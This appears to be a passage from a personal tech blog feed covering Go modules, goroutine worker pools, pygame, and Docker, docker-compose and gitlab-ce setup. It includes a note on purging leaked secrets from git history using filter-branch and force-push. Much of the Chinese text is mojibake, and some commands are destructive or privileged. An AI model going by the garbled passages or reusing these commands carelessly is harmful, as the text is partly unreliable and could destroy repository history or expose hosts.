is one only <code>go.mod</code>, and it actually represents both <code>go.mod</code> and <code>go.sum</code>. If you import exterior golangâ€™s mod, then you <strong>right-click</strong> the <code>go.mod</code> and <code>go mod tidy</code>, IDE automaticly create or update <code>go.sum</code>, dwelt with your codeâ€™s new modules.</p><p><img src="/2024/08/24/Go/goModInit/gomodTidy.png" alt="gomodTidy"></p><p>Normally, you dont need to focus what is <code>go mod</code> or <code>go module</code> during using goland, goland will help you to deal with the download of different exterior go module.</p><p>I will show you what are go.sum and go.mod. go.mod contains your name(in the init case I named the project xxx, and in the example files and pictures named gitlab-misconfig) and your module dependencies.</p><p>go.sum is a checkfile, it contains the dependenciesâ€™ hash summary, to demostrate its raw dependenciesâ€™ hash.</p><p>go.mod</p><pre><code class="lang-go.mod">module gitlab-misconfiggo 1.19require (    github.com/google/go-querystring v1.1.0    github.com/hashicorp/go-cleanhttp v0.5.2    github.com/hashicorp/go-retryablehttp v0.7.1    github.com/sirupsen/logrus v1.9.0    github.com/spf13/cobra v1.6.1    github.com/spf13/viper v1.14.0    github.com/stretchr/testify v1.8.1    github.com/xanzy/go-gitlab v0.79.1    github.com/xuri/excelize/v2 v2.7.0    golang.org/x/oauth2 v0.3.0    golang.org/x/time v0.3.0)require (    github.com/davecgh/go-spew v1.1.1 // indirect    github.com/fsnotify/fsnotify v1.6.0 // indirect    github.com/pelletier/go-toml v1.9.5 // indirect    github.com/pelletier/go-toml/v2 v2.0.5 // indirect    github.com/pmezard/go-difflib v1.0.0 // indirect    github.com/richardlehane/mscfb v1.0.4 // indirect    github.com/richardlehane/msoleps v1.0.3 // indirect    github.com/spf13/afero v1.9.2 // indirect    github.com/spf13/cast v1.5.0 // indirect    github.com/spf13/jwalterweatherman v1.1.0 // indirect    github.com/spf13/pflag v1.0.5 // indirect)</code></pre><p>go.sum</p><pre><code class="lang-go.sum">cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=cloud.google.com/go v0.34.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=cloud.google.com/go v0.38.0/go.mod h1:990N+gfupTy94rShfmMCWGDn0LpTmnzTp2qbd1dvSRU=cloud.google.com/go v0.44.1/go.mod h1:iSa0KzasP4Uvy3f1mN/7PiObzGgflwredwwASm/v6AU=cloud.google.com/go v0.44.2/go.mod h1:60680Gw3Yr4ikxnPRS/oxxkBccT6SA1yMk63TGekxKY=cloud.google.com/go v0.44.3/go.mod h1:60680Gw3Yr4ikxnPRS/oxxkBccT6SA1yMk63TGekxKY=</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gité‡å†™å†å²</title>
      <link href="/2024/08/24/git/git%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/"/>
      <url>/2024/08/24/git/git%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ç¬¬ä¸€å®¶å…¬å¸å·¥ä½œï¼Œæˆ‘æ›¾ç»å†™äº†ä»git historyæ£€æŸ¥secret leaksçš„å¼•æ“å·¥ä½œã€‚ä½†æ˜¯å½“æ—¶ä½œä¸ºæ–°äººï¼Œå¯¹git historyäº†è§£æœ‰é™ï¼Œå½“æ—¶å‘ç°gitç›®å½•ä¸‹secretå·²è¢«åˆ é™¤ï¼Œä½†æ˜¯æ‰«ægit historyæ—¶åˆä¾æ—§æ£€æµ‹å‡ºæœ¬æ¥å·²ç»è¢«åˆ é™¤çš„secretçš„å¹½çµã€‚åæ¥æ‰çŸ¥é“ï¼ŒåŸæ¥æ˜¯git historyæ˜¯æŒç»­æ€§å­˜å‚¨å†å²ä»£ç ï¼Œè€Œæˆ‘å½“æ—¶å•çº¯ä»æœ€æ–°commitåˆ é™¤äº†secretï¼Œä½†æ˜¯git historyä¸­ä¾ç„¶ä¼šå­˜åœ¨è¿™ä¸ªcode snippetã€‚</p><p>å¯æƒœå½“æ—¶å·¥ä½œçš„æ—¶å€™å¹¶æ²¡æœ‰å¯¹æˆ‘çš„ä»£ç æ‰«æå™¨åšæ›´è¿›ä¸€æ­¥è§„åˆ’ï¼Œä¹Ÿæœªèƒ½åŠæ—¶å’Œé¢†å¯¼ã€å®¢æˆ·æå‡ºé—®é¢˜æ‰€åœ¨ï¼Œåæ¥ç¦»èŒåï¼Œæˆ‘è‡ªä¸ªå„¿ç ”ç©¶ï¼Œå‘ç°ç¡®å®æœ‰gité‡å†™å†å²çš„å·¥å…·ï¼Œå°½ç®¡ä»–ä¸é‚£ä¹ˆæ™®éã€‚é—æ†¾æˆ‘æ²¡æœ‰æƒ³åˆ°è¿™ä¹ˆå¤šï¼Œæ˜¯æˆ‘è¿‡å»çš„å¤±è¯¯ï¼Œä»Šå¤©ä»¥blogè¡¥ä¸Šå½“æ—¶æˆ‘å¿˜è®°çš„çŸ¥è¯†ç‚¹ã€‚</p><p>å¦‚æœè¦åˆ é™¤ git history å¸¦æ¥çš„ leakage, éœ€è¦å…ˆæŠŠè¿™ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œç„¶åä»¥æ–‡ä»¶ä¸ºå•ä½å°†git historyæ”¹å†™ï¼Œæœ€åå†é‡æ–°æŠŠæ­£ç¡®çš„æ–‡ä»¶ä¸Šä¼ å³å¯ã€‚</p><p>gité‡å†™å†å²æ­¥éª¤å¦‚ä¸‹ï¼š</p><pre><code>git filter-branch --index-filter &quot;git rm -r --cached --ignore-unmatch ./éƒ¨ç½²æ–‡ä»¶&quot; HEAD`git filter-branch --index-filter &quot;git rm -r --cached --ignore-unmatch ./backend/volume/media/import_excel_upload/*&quot; HEAD</code></pre><p>æ£€æŸ¥æˆåŠŸæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶åï¼Œç„¶å</p><pre><code>git push --force</code></pre><p>å¦‚æœæç¤ºéœ€è¦åŠ  -f å¼ºåˆ¶é‡å†™ï¼Œå¦‚ï¼š</p><pre><code>git filter-branch -f --index-filter &quot;git rm -r --cached --ignore-unmatch ./backend/volume/media/import_excel_upload/*&quot; HEAD</code></pre><p>æœ€ågit pushå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>goland goroutine, workers and chan</title>
      <link href="/2024/08/24/Go/go_gorutines/"/>
      <url>/2024/08/24/Go/go_gorutines/</url>
      
        <content type="html"><![CDATA[<h3 id="Code-Snippet"><a href="#Code-Snippet" class="headerlink" title="Code Snippet"></a>Code Snippet</h3><pre><code>package mainimport (    &quot;fmt&quot;    &quot;sync&quot;)func worker(ports chan int, wg *sync.WaitGroup) &#123;    for p := range ports &#123;    # P receive one value from the chan ports        fmt.Println(&quot;p&quot;, p)        wg.Done()    &#125;&#125;func main() &#123;    ports := make(chan int, 100)    var wg sync.WaitGroup    for i := 0; i &lt; cap(ports); i++ &#123;        go worker(ports, &amp;wg)    &#125;    for i := 1; i &lt; 1024; i++ &#123;        wg.Add(1)        ports &lt;- i    &#125;    wg.Wait()    close(ports)&#125;</code></pre><h3 id="å£è¯€"><a href="#å£è¯€" class="headerlink" title="å£è¯€"></a>å£è¯€</h3><ol><li><p>Init Async Tasks, wg</p><p> Init make chain å’Œ var wg<br> ports := make(chan int, 100)<br> var wg sync.WaitGroup</p></li><li><p>ä¿©å¾ªç¯ï¼Œä¸€ çº¯go workerï¼ŒäºŒ add 1 æ‰”ä»»åŠ¡ï¼š</p><h2 id="cap-go-worker"><a href="#cap-go-worker" class="headerlink" title="cap go worker"></a>cap go worker</h2><p>wg.Add(1)<br>ports &lt;- i</p></li><li><p>å•workerå†… Done </p><p> for p := range ports {</p><pre><code>     fmt.Println(&quot;p&quot;, p)     wg.Done() &#125;</code></pre></li><li><p>ä¿©ç»ˆç»“ï¼Œç­‰ä¸å…³</p><p> wg.Wait()<br> close(ports)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pygame exploration</title>
      <link href="/2024/08/24/trivia/pygame%20exploration/"/>
      <url>/2024/08/24/trivia/pygame%20exploration/</url>
      
        <content type="html"><![CDATA[<p>Sometimes I think interests can motivate programmers to explore new techniques and keep the enthusiam to optimise current workout. So last week I researched pygame and just had a little try to use it, unfortunately I found it is not such useful frames. I think as a new learner, you may heard Django, Flask and Pygame, because they are popular framework by Python. But eventually, I need to say, pygame is not such useful and interesting as Django.</p><p>What I learned are from these sources:</p><pre><code>https://github.com/pygame/pygamehttps://www.pygame.org/docs/https://www.youtube.com/watch?v=AY9MnQ4x3zk&amp;t=636s</code></pre><p>I run some codes of pygame, and the conclusion:</p><ol><li><p>It cannot produce a little tremendous or remarkable games, such as Red alert. It can only basicly produce too simple little games, and I think its maxmium limit is Metal Slug, such as the reference: <a href="https://www.youtube.com/watch?v=hnKocNdF9-U">https://www.youtube.com/watch?v=hnKocNdF9-U</a> . If you want to develop great ideas and games, some famous gaming engines are recommanded.</p></li><li><p>It cannot be used in Scientific calculation and visibility. It can show picture clearly, but many lines, curves, arcs, texts are too pixel. If you use pygame to draw some graphs or charts, the workout could be much ambiguous with out precision.</p></li><li><p>It is weak in building and compilation. I often see others use Pyinstaller(the file size could be too big normally) to compile the source codes into an execution file. As a frame of game, it lacks the transplatforms functions.</p></li></ol><p>Of course, if you want to make GalGame(My friendâ€™s idea, not mine), I think pygame is suitable, it can simply load images, audio and video, you can use the collision feature to realize your ideas rapidly, but how to generate your ideal images would be a challange.</p><p>Totally, when talking about games, my friends and classmates rarely use pygame, and I agree it may have little useful and amazing functions.</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ„å»ºgitleaks-DockeræœåŠ¡</title>
      <link href="/2024/04/09/docker/docker-compose+dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/04/09/docker/docker-compose+dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>ä¸¤ä¸ªä¸€å—å„¿ç”¨ï¼ŒDockerfileåœ¨docker-compose.yamlçš„åŒç›®å½•ä¸‹ã€‚</p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><pre><code>FROM amd64/alpine:3.14RUN apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdataADD ./SecretDetectionDir /webscan/WORKDIR /webscanEXPOSE 8000ENTRYPOINT [&quot;/webscan/http&quot;]</code></pre><h1 id="docker-compose-yaml"><a href="#docker-compose-yaml" class="headerlink" title="docker-compose.yaml"></a>docker-compose.yaml</h1><pre><code>version: &quot;3&quot;services:secretdetection_docker:    build: .    container_name: secretdetection_http    ports:    - &quot;8000:8000&quot;    restart: always</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-composeè°ƒè¯•å’Œæ“ä½œ</title>
      <link href="/2024/04/09/docker/docker-compose%E8%B0%83%E8%AF%95/"/>
      <url>/2024/04/09/docker/docker-compose%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–¹ä¾¿è°ƒè¯•çš„æŠ€å·§"><a href="#æ–¹ä¾¿è°ƒè¯•çš„æŠ€å·§" class="headerlink" title="æ–¹ä¾¿è°ƒè¯•çš„æŠ€å·§"></a>æ–¹ä¾¿è°ƒè¯•çš„æŠ€å·§</h1><pre><code>docker-compose down &amp;&amp; docker-compose rebuild &amp;&amp; docker-compose up -d</code></pre><h1 id="docker-composeæ“ä½œ"><a href="#docker-composeæ“ä½œ" class="headerlink" title="docker-composeæ“ä½œ"></a>docker-composeæ“ä½œ</h1><pre><code>docker-compose build æ„å»ºé•œåƒï¼Œé•œåƒæ–‡ä»¶ä¼šå­˜åœ¨docker imagesä¸­docker-compose up -d å¯åŠ¨å®¹å™¨docker-compose down ç§»é™¤å®¹å™¨ï¼ˆè¿™ç‚¹æˆ‘ä»¥å‰ä»¥ä¸ºdownæ˜¯ç±»ä¼¼äºdocker stopçš„å‘½ä»¤ï¼Œæ²¡æƒ³åˆ°docker-compose downæ˜¯ç§»é™¤çš„æ„æ€ï¼Œå¯¼è‡´åˆ åº“ï¼‰docker-compose stop æš‚åœå®¹å™¨è¿è¡Œ</code></pre><h1 id="å¯¼å‡ºå¯¼å…¥æ“ä½œ"><a href="#å¯¼å‡ºå¯¼å…¥æ“ä½œ" class="headerlink" title="å¯¼å‡ºå¯¼å…¥æ“ä½œ"></a>å¯¼å‡ºå¯¼å…¥æ“ä½œ</h1><p>å‚è€ƒé“¾æ¥:<a href="https://www.hangge.com/blog/cache/detail_2411.html">https://www.hangge.com/blog/cache/detail_2411.html</a></p><p>ä¸è¿‡éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå¯¼å…¥å¯¼å‡ºçš„æ—¶å€™æœ€å¥½æ ¹æ®<code>docker ps -a</code>çš„ åå­—æ¥æ“ä½œï¼Œä¸è¦æ ¹æ® container id æ¥æ“ä½œã€‚å¦åˆ™å¯¼å…¥çš„æ—¶å€™ï¼Œæ˜¾ç¤ºçš„åå­—å¯èƒ½æ˜¯ <none>ã€‚è¿™ä¸ªæ—¶å€™è™½ç„¶å®¹å™¨å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯å¾ˆå¤šäººä¼šæ„Ÿè§‰<none>æ˜¯é”™è¯¯çš„ã€‚</none></none></p><p>æœ€é‡è¦çš„æ³¨æ„ï¼Œ<strong>docker-composeæ— æ³•æ„å»ºå®¹å™¨ä¸ºé•œåƒï¼Œè€Œä¸”ä¹Ÿä¸ä¼šå¤åˆ¶å¤–éƒ¨ç›®å½•åˆ°å†…éƒ¨</strong>ï¼Œæœ‰çš„ä»…ä»…æ˜¯volumns: xxx:xxxçš„æŒ‚è½½ã€‚å¦‚æœå®¹å™¨æ˜¯ä½¿ç”¨çš„æŒ‚è½½ç›®å½•ï¼Œè€Œä¸æ˜¯å¤åˆ¶è¿›å»çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¼šæ— æ³•è¿è¡Œç›¸åº”ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç¨‹åºã€‚</p><p>æ‰€ä»¥Dockerfileå’Œdockerf-compose.ymlç»“åˆä½¿ç”¨ã€‚</p><h1 id="å®¹å™¨ï¼šexportå’Œimport"><a href="#å®¹å™¨ï¼šexportå’Œimport" class="headerlink" title="å®¹å™¨ï¼šexportå’Œimport"></a>å®¹å™¨ï¼šexportå’Œimport</h1><pre><code>docker export f299f501774c &gt; hangger_server.tardocker import - new_hangger_server &lt; hangger_server.tar</code></pre><h1 id="é•œåƒï¼šsaveå’Œload"><a href="#é•œåƒï¼šsaveå’Œload" class="headerlink" title="ã€€é•œåƒï¼šsaveå’Œload"></a>ã€€é•œåƒï¼šsaveå’Œload</h1><p>ï¼ˆ1ï¼‰ä¸‹é¢ä½¿ç”¨ docker save å‘½ä»¤æ ¹æ® ID å°†é•œåƒä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ã€‚</p><pre><code>docker save 0fdf2b4c26d3 &gt; hangge_server.tar</code></pre><p><strong>(è¿™ä¹ˆæ‰“åŒ…ï¼Œæ˜¯æ²¡æœ‰æ ‡ç­¾åå­—çš„ã€‚æœ€å¥½æŒ‡å®šé•œåƒæ ‡ç­¾åè€Œéé•œåƒidæ‰“åŒ…)</strong></p><p>ï¼ˆ2ï¼‰æˆ‘ä»¬è¿˜å¯ä»¥åŒæ—¶å°†å¤šä¸ª image æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚ä¸‹é¢å°†é•œåƒåº“ä¸­çš„ postgres å’Œ mongo æ‰“åŒ…ï¼š</p><pre><code>docker save -o images.tar postgres:9.6 mongo:3.4</code></pre><p>è½½å…¥é•œåƒ</p><pre><code>docker load &lt; hangge_server.tar</code></pre><h1 id="SDçš„é•œåƒæ‰“åŒ…åŠè¿è¡Œ"><a href="#SDçš„é•œåƒæ‰“åŒ…åŠè¿è¡Œ" class="headerlink" title="SDçš„é•œåƒæ‰“åŒ…åŠè¿è¡Œ"></a>SDçš„é•œåƒæ‰“åŒ…åŠè¿è¡Œ</h1><h3 id="æ‰“åŒ…å¯¼å‡º"><a href="#æ‰“åŒ…å¯¼å‡º" class="headerlink" title="æ‰“åŒ…å¯¼å‡º"></a>æ‰“åŒ…å¯¼å‡º</h3><p>å…ˆå‘½åä¸ªç‰ˆæœ¬</p><pre><code>docker tag f0b0777d65d7 sd_secretdetection_docker:2.3</code></pre><p>æ‰“åŒ…ï¼Œä¸è¦æ ¹æ®é•œåƒidæ‰“åŒ…ï¼Œä¸ç„¶æœªæ¥æ²¡æœ‰åå­—ï¼Œå¾—æŒ‡å®štagï¼š</p><pre><code>docker save -o sd-2.3.tar sd_secretdetection_docker:2.3</code></pre><p>åŠ è½½è¿è¡Œ</p><pre><code>docker load &lt; sd-2.3.tardocker run -itd -p 8000:8000 sd_secretdetection_docker:2.3</code></pre><p>runé•œåƒï¼Œå¹¶æŒ‡å®šå®¹å™¨åå­—</p><p>æŒ‡å®šé•œåƒåå­—:</p><pre><code>docker run --name my_container my_imagedocker load &lt; shenyanjian.tardocker run -itd -p 8000:8000 --name secretdetection shenyanjian_secretdetection_docker:latest</code></pre><p>å°†å®¹å™¨ä¿å­˜ä¸ºæœ¬åœ°é•œåƒ</p><pre><code>docker commit -a &quot;blingsec&quot; -m &quot;sd2.0&quot; secret_detection_http secret_detection_http:v2.0</code></pre><p>-aæ˜¯ä½œè€…åï¼Œ-m æ˜¯æ ‡æ³¨ä¿¡æ¯ï¼Œæœ€åçš„secret_detection_http:v2.0 æ˜¯å‘½å</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker network</title>
      <link href="/2024/04/09/docker/docker-network/"/>
      <url>/2024/04/09/docker/docker-network/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-networkç½‘ç»œçš„ä¼˜åŠ¿"><a href="#docker-networkç½‘ç»œçš„ä¼˜åŠ¿" class="headerlink" title="docker networkç½‘ç»œçš„ä¼˜åŠ¿"></a><strong>docker networkç½‘ç»œçš„ä¼˜åŠ¿</strong></h1><p>åŒä¸€ä¸ª Docker <strong>ç½‘ç»œä¸­çš„å®¹å™¨ä¹‹é—´å¯ä»¥ä½¿ç”¨å®¹å™¨åè¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œå°±åƒè®¿é—®åŸŸåä¸€æ ·</strong>ã€‚è¿™æ˜¯å› ä¸º Docker é»˜è®¤æä¾›äº†ä¸€ä¸ªå†…ç½®çš„ DNS æœåŠ¡ï¼Œå®ƒä¼šä¸ºåœ¨åŒä¸€ç½‘ç»œä¸­è¿è¡Œçš„å®¹å™¨åˆ†é…ä¸»æœºåï¼Œå¹¶ä¸”å…¶ä»–å®¹å™¨å¯ä»¥ä½¿ç”¨è¿™äº›ä¸»æœºåè¿›è¡Œé€šä¿¡ã€‚</p><h1 id="åˆ›å»ºdocker-network"><a href="#åˆ›å»ºdocker-network" class="headerlink" title="åˆ›å»ºdocker network"></a>åˆ›å»ºdocker network</h1><p>ä½¿ç”¨ Docker ç½‘ç»œï¼šå¦ä¸€ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆæ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„ Docker ç½‘ç»œï¼Œå¹¶åœ¨è¿™ä¸ªç½‘ç»œä¸Šè¿è¡Œä½ çš„å®¹å™¨ã€‚ä½ å¯ä»¥ä½¿ç”¨ docker network create å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘ç»œï¼Œç„¶åä½¿ç”¨ â€”network é€‰é¡¹è¿è¡Œä½ çš„å®¹å™¨ã€‚</p><p>è°ƒæ•´é˜²ç«å¢™è§„åˆ™ï¼šå¦‚æœä½ çš„ä¸»æœºä¸Šè¿è¡Œæœ‰é˜²ç«å¢™ï¼Œå¯èƒ½éœ€è¦è°ƒæ•´é˜²ç«å¢™è§„åˆ™ä»¥å…è®¸ Docker å®¹å™¨è®¿é—®å†…ç½‘ã€‚å…·ä½“çš„æ­¥éª¤å–å†³äºä½ çš„é˜²ç«å¢™è½¯ä»¶å’Œé…ç½®ã€‚</p><p><strong>æ£€æŸ¥ DNS é…ç½®ï¼šå¦‚æœä½ çš„é—®é¢˜ä¸ DNS è§£ææœ‰å…³ï¼Œå¯èƒ½éœ€è¦æ£€æŸ¥å’Œè°ƒæ•´ä½ çš„ Docker å®¹å™¨çš„ DNS é…ç½®ã€‚ä½ å¯ä»¥é€šè¿‡åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ /etc/docker/daemon.jsonï¼‰ä¸­è®¾ç½® dns é€‰é¡¹æ¥å…¨å±€é…ç½® DNSï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ â€”dns é€‰é¡¹åœ¨è¿è¡Œå®¹å™¨æ—¶æŒ‡å®š DNSã€‚</strong></p><p><strong>ä½¿ç”¨ VPNï¼šå¦‚æœä½ çš„å†…ç½‘æœåŠ¡åœ¨ VPN åé¢ï¼Œä½ å¯èƒ½éœ€è¦åœ¨ Docker å®¹å™¨ä¸­è®¾ç½® VPNã€‚è¿™å¯èƒ½éœ€è¦åœ¨ä½ çš„ Docker é•œåƒä¸­å®‰è£…å’Œé…ç½® VPN å®¢æˆ·ç«¯ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker volume</title>
      <link href="/2024/04/09/docker/docker-volume/"/>
      <url>/2024/04/09/docker/docker-volume/</url>
      
        <content type="html"><![CDATA[<p>docker volume æœ‰ ls rmç­‰å­å‘½ä»¤</p><p>ä½¿ç”¨ docker rm å‘½ä»¤åˆ é™¤å®¹å™¨æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ä¼šåˆ é™¤ä¸è¯¥å®¹å™¨å…³è”çš„æŒ‚è½½çš„ <strong>Docker å·ï¼ˆDocker volumeï¼‰</strong>ã€‚Docker volume æ˜¯ä¸€ä¸ªç‹¬ç«‹äºå®¹å™¨çš„æ•°æ®å­˜å‚¨åŒºåŸŸï¼Œé€šå¸¸ç”¨äºæŒä¹…åŒ–å­˜å‚¨å®¹å™¨å†…çš„æ•°æ®ã€‚</p><p>å¦‚æœæ‚¨ä½¿ç”¨äº† -v å‚æ•°æ¥æŒ‚è½½å·ï¼Œé‚£ä¹ˆåˆ é™¤å®¹å™¨æ—¶ä¸ä¼šåˆ é™¤è¿™ä¸ªå·ã€‚è¦åˆ é™¤ä¸å®¹å™¨å…³è”çš„å·ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ docker volume rm å‘½ä»¤ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„å®¹å™¨å¯åŠ¨å‘½ä»¤ä¸­æœ‰å¦‚ä¸‹çš„ -v å‚æ•°ï¼š</p><pre><code>docker run -v /host/path:/container/path my_image</code></pre><p>é‚£ä¹ˆåˆ é™¤å®¹å™¨æ—¶ï¼Œå· /host/path ä¸ä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚è¦æ‰‹åŠ¨åˆ é™¤è¯¥å·ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre><code>docker volume rm $(docker volume ls -qf &quot;mount=/host/path&quot;)</code></pre><p>è¿™å°†åˆ é™¤ä¸æŒ‡å®šè·¯å¾„å…³è”çš„ Docker å·ã€‚è¯·æ³¨æ„æ›¿æ¢ /host/path ä¸ºå®é™…ä½¿ç”¨çš„å·è·¯å¾„ã€‚</p><p>æ€»ä¹‹ï¼Œdocker rm é»˜è®¤ä¸ä¼šåˆ é™¤æŒ‚è½½çš„ Docker å·ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ docker volume rm å‘½ä»¤æ‰‹åŠ¨åˆ é™¤å®ƒä»¬ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockerhub &amp;&amp; docker</title>
      <link href="/2024/04/09/docker/docker/"/>
      <url>/2024/04/09/docker/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸­å›½ç”¨æˆ·æ¢æº"><a href="#ä¸­å›½ç”¨æˆ·æ¢æº" class="headerlink" title="ä¸­å›½ç”¨æˆ·æ¢æº"></a>ä¸­å›½ç”¨æˆ·æ¢æº</h1><pre><code>vim /etc/docker/daemon.json&#123;&quot;registry-mirrors&quot;:[&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.aliyuncs.com&quot;,&quot;https://registry.docker-cn.com&quot;,&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;service docker restart</code></pre><h1 id="dockerhub"><a href="#dockerhub" class="headerlink" title="dockerhub"></a>dockerhub</h1><p>log in <a href="https://hub.docker.com/">https://hub.docker.com/</a>, register an account.</p><p>pull your private image</p><pre><code>docker pull senranja/secret_detection</code></pre><p>build an image with tag, upload image to dockerhub</p><pre><code>docker image build -t senranja/secret_detection:v2.1 .docker logindocker push username/repo:tag</code></pre><h1 id="æ­å»ºgitlab-ceä¸ºä¾‹"><a href="#æ­å»ºgitlab-ceä¸ºä¾‹" class="headerlink" title="æ­å»ºgitlab-ceä¸ºä¾‹"></a>æ­å»ºgitlab-ceä¸ºä¾‹</h1><p>å®‰è£…gitlab-ceå‚è€ƒé“¾æ¥ï¼š</p><pre><code>https://blog.csdn.net/BThinker/article/details/124097795</code></pre><p>æŸ¥æ‰¾é•œåƒ</p><pre><code>docker search gitlab</code></pre><p>æ‹‰å–Gitlabé•œåƒ</p><pre><code>docker pull gitlab/gitlab-ce:latest</code></pre><p>å¯åŠ¨å®¹å™¨ï¼Œè¿™é‡Œdocker runå‘½ä»¤çš„-vå’Œdockerfileä»¥åŠdocker-compose.yamlä¸­çš„-v æŒ‚åœ¨ç›®å½•ï¼Œä¸éœ€è¦ä½ è‡ªå·±æ‰‹åŠ¨åˆ›å»ºç›®å½•ã€‚å³ä¾¿ç›®å½•ä¸å­˜åœ¨ï¼Œä»–ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</p><pre><code>docker run \-itd  \-p 9980:80 \-p 9922:22 \-v /home/gitlab/etc:/etc/gitlab  \-v /home/gitlab/log:/var/log/gitlab \-v /home/gitlab/opt:/var/opt/gitlab \--restart always \--privileged=true \--name gitlab \gitlab/gitlab-ce</code></pre><p>å‘½ä»¤</p><pre><code>-i     ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨å‘½ä»¤è§£é‡Š-t     ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨-d    åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨ID-p 9980:80    å°†å®¹å™¨å†…80ç«¯å£æ˜ å°„è‡³å®¿ä¸»æœº9980ç«¯å£ï¼Œè¿™æ˜¯è®¿é—®gitlabçš„ç«¯å£-p 9922:22     å°†å®¹å™¨å†…22ç«¯å£æ˜ å°„è‡³å®¿ä¸»æœº9922ç«¯å£ï¼Œè¿™æ˜¯è®¿é—®sshçš„ç«¯å£-v /home/gitlab/etc:/etc/gitlab    å°†å®¹å™¨/etc/gitlabç›®å½•æŒ‚è½½åˆ°å®¿ä¸»æœº/usr/local/gitlab-test/etcç›®å½•ä¸‹ï¼Œè‹¥å®¿ä¸»æœºå†…æ­¤ç›®å½•ä¸å­˜åœ¨å°†ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå…¶ä»–ä¸¤ä¸ªæŒ‚è½½åŒè¿™ä¸ªä¸€æ ·--restart always    å®¹å™¨è‡ªå¯åŠ¨--privileged=true    è®©å®¹å™¨è·å–å®¿ä¸»æœºrootæƒé™--name gitlab    è®¾ç½®å®¹å™¨åç§°ä¸ºgitlabgitlab/gitlab-ce    é•œåƒçš„åç§°ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥å†™é•œåƒID</code></pre><h1 id="å¤åˆ¶ç›®å½•ç»†èŠ‚"><a href="#å¤åˆ¶ç›®å½•ç»†èŠ‚" class="headerlink" title="å¤åˆ¶ç›®å½•ç»†èŠ‚"></a>å¤åˆ¶ç›®å½•ç»†èŠ‚</h1><p>å±è‚¡åŠ ä¸åŠ  /æ²¡åŒºåˆ«</p><ol><li><p>ç›®å½•ä¸‹æ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ä¸‹ï¼Œä¸åŒ…å«ç›®å½•æœ¬èº«</p><p>COPY ./dist/ /usr/share/nginx/html/</p></li></ol><p>æ˜¯å°† ./dist/ä¸‹æ–‡ä»¶ æ”¾å…¥ /html/ï¼Œdistæœ¬èº«æ²¡ç›®å½•</p><ol><li><p>è¿å¸¦è¿™ä¸ªç›®å½•å¤åˆ¶è¿›å…¥</p><p>COPY ./dist 